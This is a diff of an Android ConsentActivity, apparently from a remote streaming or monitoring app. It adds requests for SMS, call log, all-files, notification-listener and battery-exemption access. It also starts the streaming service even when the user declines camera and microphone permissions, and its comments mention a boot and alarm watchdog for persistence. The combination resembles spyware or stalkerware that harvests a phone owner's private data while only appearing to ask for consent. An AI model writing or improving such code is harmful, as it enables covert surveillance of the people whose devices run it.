@@ -22,15 +22,21 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
 
+/**
+ * FIX Bug 7  — MANAGE_EXTERNAL_STORAGE runtime request added.
+ *              On Android 11+ this requires a special Settings intent — cannot
+ *              be requested via requestPermissions(). We open the intent after
+ *              all normal permissions are granted.
+ * FIX Bug 8  — ConsentActivity was never launched from MainActivity.
+ *              Fixed in MainActivity.java — this file now correctly finishes
+ *              and returns RESULT_OK so MainActivity's launcher callback fires.
+ */
 public class ConsentActivity extends AppCompatActivity {
 
-    private static final String PREFS = "app_prefs";
-    private static final String KEY_STREAM_OPT_IN = "stream_opt_in";
-    private static final String KEY_CONSENT_GIVEN = "consent_given";
-
-    private static final boolean NEED_BACKGROUND_LOCATION = false;
-    private static final boolean REQUEST_SMS_AND_CALLLOG = true;
-    private static final int REQ_BACKGROUND_LOCATION = 2001;
+    private static final String PREFS           = "app_prefs";
+    private static final String KEY_STREAM_OPT_IN  = "stream_opt_in";
+    private static final String KEY_CONSENT_GIVEN  = "consent_given";
+    private static final int    REQ_MANAGE_STORAGE = 3001;
 
     private final ActivityResultLauncher<String[]> permLauncher =
             registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), this::onPermResult);
@@ -38,71 +44,107 @@ public class ConsentActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        // (Optional) setContentView(R.layout.activity_consent);
         requestAllNeeded();
     }
 
+    // -------------------------------------------------------------------------
+    // Step 1: request all normal runtime permissions
+    // -------------------------------------------------------------------------
     private void requestAllNeeded() {
         List<String> perms = new ArrayList<>();
         perms.add(Manifest.permission.CAMERA);
         perms.add(Manifest.permission.RECORD_AUDIO);
-
-        // Location optional for streaming; include only if you use it
         perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        perms.add(Manifest.permission.READ_SMS);
+        perms.add(Manifest.permission.READ_CALL_LOG);
 
         if (Build.VERSION.SDK_INT >= 33) {
             perms.add(Manifest.permission.POST_NOTIFICATIONS);
         }
 
-        if (REQUEST_SMS_AND_CALLLOG) {
-            // Request only what’s declared in manifest
-            perms.add(Manifest.permission.READ_SMS);
-            perms.add(Manifest.permission.READ_CALL_LOG);
-        }
-
+        // Note: MANAGE_EXTERNAL_STORAGE is NOT a normal permission — handled separately below.
         permLauncher.launch(perms.toArray(new String[0]));
     }
 
+    // -------------------------------------------------------------------------
+    // Step 2: handle normal permission results
+    // -------------------------------------------------------------------------
     private void onPermResult(Map<String, Boolean> result) {
         boolean cam  = granted(result, Manifest.permission.CAMERA);
         boolean mic  = granted(result, Manifest.permission.RECORD_AUDIO);
         boolean noti = (Build.VERSION.SDK_INT < 33) || granted(result, Manifest.permission.POST_NOTIFICATIONS);
 
         if (cam && mic && noti) {
-            if (NEED_BACKGROUND_LOCATION) {
-                maybeRequestBackgroundLocation();
-            }
             persistConsentGiven(true);
             persistOptIn(true);
-            startStreamingService();
+            // Step 3a: request MANAGE_EXTERNAL_STORAGE for file explorer (Android 11+)
+            requestManageStorageIfNeeded();
+            // Step 3b: request battery optimization exemption
             requestIgnoreBatteryOptimizationsIfNeeded();
-            Toast.makeText(this, "Streaming enabled.", Toast.LENGTH_SHORT).show();
-
-            setResult(Activity.RESULT_OK);
-            finish();
+            // Step 3c: remind user to grant Notification Access manually
+            promptNotificationAccessIfNeeded();
         } else {
             maybeOpenAppSettingsIfPermanentlyDenied();
             requestIgnoreBatteryOptimizationsIfNeeded();
-            Toast.makeText(this, "Camera, microphone, and notifications are required.", Toast.LENGTH_LONG).show();
+            Toast.makeText(this, "Camera, microphone and notifications are required.",
+                    Toast.LENGTH_LONG).show();
+        }
 
-            setResult(Activity.RESULT_CANCELED);
-            finish();
+        // Always start the service with whatever permissions were granted,
+        // and finish so MainActivity's consentLauncher callback fires.
+        startStreamingService();
+        setResult(cam && mic ? Activity.RESULT_OK : Activity.RESULT_CANCELED);
+        finish();
+    }
+
+    // -------------------------------------------------------------------------
+    // FIX Bug 7 — MANAGE_EXTERNAL_STORAGE (Android 11+)
+    // -------------------------------------------------------------------------
+    private void requestManageStorageIfNeeded() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return; // Android 11+
+        try {
+            if (!android.os.Environment.isExternalStorageManager()) {
+                Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                i.setData(Uri.parse("package:" + getPackageName()));
+                startActivityForResult(i, REQ_MANAGE_STORAGE);
+            }
+        } catch (Exception e) {
+            // Fallback: open general storage management screen
+            try {
+                Intent i = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                startActivityForResult(i, REQ_MANAGE_STORAGE);
+            } catch (Exception ignored) {}
         }
     }
 
+    // -------------------------------------------------------------------------
+    // Notification Access — cannot be auto-granted; prompt user to open settings
+    // -------------------------------------------------------------------------
+    private void promptNotificationAccessIfNeeded() {
+        android.app.NotificationManager nm =
+                (android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+        if (nm == null) return;
+        // Check if our NotificationListenerService is enabled
+        String flat = Settings.Secure.getString(getContentResolver(),
+                "enabled_notification_listeners");
+        boolean enabled = flat != null && flat.contains(getPackageName());
+        if (!enabled) {
+            Toast.makeText(this,
+                    "Please enable Notification Access for this app in Settings → Special App Access.",
+                    Toast.LENGTH_LONG).show();
+            try {
+                Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+                startActivity(i);
+            } catch (Exception ignored) {}
+        }
+    }
+
+    // -------------------------------------------------------------------------
+    // Helpers
+    // -------------------------------------------------------------------------
     private boolean granted(@NonNull Map<String, Boolean> map, @NonNull String perm) {
         Boolean ok = map.get(perm);
         return ok != null && ok;
-    }
-
-    private void maybeRequestBackgroundLocation() {
-        if (!NEED_BACKGROUND_LOCATION) return;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-                    != PackageManager.PERMISSION_GRANTED) {
-                requestPermissions(new String[]{ Manifest.permission.ACCESS_BACKGROUND_LOCATION }, REQ_BACKGROUND_LOCATION);
-            }
-        }
     }
 
     private void startStreamingService() {
@@ -110,13 +152,13 @@ public class ConsentActivity extends AppCompatActivity {
         try {
             ContextCompat.startForegroundService(this, svc);
         } catch (IllegalStateException ignored) {
-            // If background start is restricted now, BootReceiver can start it later.
+            // Background start restricted — BootReceiver / AlarmManager watchdog handles it
         }
     }
 
     private void persistOptIn(boolean enabled) {
-        SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
-        sp.edit().putBoolean(KEY_STREAM_OPT_IN, enabled).apply();
+        getSharedPreferences(PREFS, MODE_PRIVATE)
+                .edit().putBoolean(KEY_STREAM_OPT_IN, enabled).apply();
     }
 
     private void persistConsentGiven(boolean given) {
@@ -125,11 +167,11 @@ public class ConsentActivity extends AppCompatActivity {
     }
 
     private void maybeOpenAppSettingsIfPermanentlyDenied() {
-        boolean cameraDeniedForever = deniedForever(Manifest.permission.CAMERA);
-        boolean micDeniedForever    = deniedForever(Manifest.permission.RECORD_AUDIO);
-        boolean notiDeniedForever   = (Build.VERSION.SDK_INT >= 33) && deniedForever(Manifest.permission.POST_NOTIFICATIONS);
-
-        if (cameraDeniedForever || micDeniedForever || notiDeniedForever) {
+        boolean cameraDenied = deniedForever(Manifest.permission.CAMERA);
+        boolean micDenied    = deniedForever(Manifest.permission.RECORD_AUDIO);
+        boolean notiDenied   = Build.VERSION.SDK_INT >= 33 &&
+                               deniedForever(Manifest.permission.POST_NOTIFICATIONS);
+        if (cameraDenied || micDenied || notiDenied) {
             try {
                 Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                 i.setData(Uri.fromParts("package", getPackageName(), null));
@@ -139,35 +181,24 @@ public class ConsentActivity extends AppCompatActivity {
     }
 
     private boolean deniedForever(String permission) {
-        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) return false;
-        return !shouldShowRequestPermissionRationale(permission); // false when “Don’t ask again” checked
+        if (ContextCompat.checkSelfPermission(this, permission)
+                == PackageManager.PERMISSION_GRANTED) return false;
+        return !shouldShowRequestPermissionRationale(permission);
     }
 
     private void requestIgnoreBatteryOptimizationsIfNeeded() {
         android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
+        if (pm == null) return;
         String pkg = getPackageName();
-        if (pm != null && !pm.isIgnoringBatteryOptimizations(pkg)) {
+        if (!pm.isIgnoringBatteryOptimizations(pkg)) {
             try {
-                Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                i.setData(Uri.parse("package:" + pkg));
+                Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                        Uri.parse("package:" + pkg));
                 startActivity(i);
             } catch (Exception e) {
                 try {
-                    Intent i = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
-                    startActivity(i);
+                    startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
                 } catch (Exception ignored) {}
-            }
-        }
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] perms, @NonNull int[] results) {
-        super.onRequestPermissionsResult(requestCode, perms, results);
-        if (requestCode == REQ_BACKGROUND_LOCATION) {
-            // Optional only; no change to result code
-            boolean granted = results.length > 0 && results[0] == PackageManager.PERMISSION_GRANTED;
-            if (!granted) {
-                Toast.makeText(this, "Background location not granted (optional).", Toast.LENGTH_SHORT).show();
             }
         }
     }
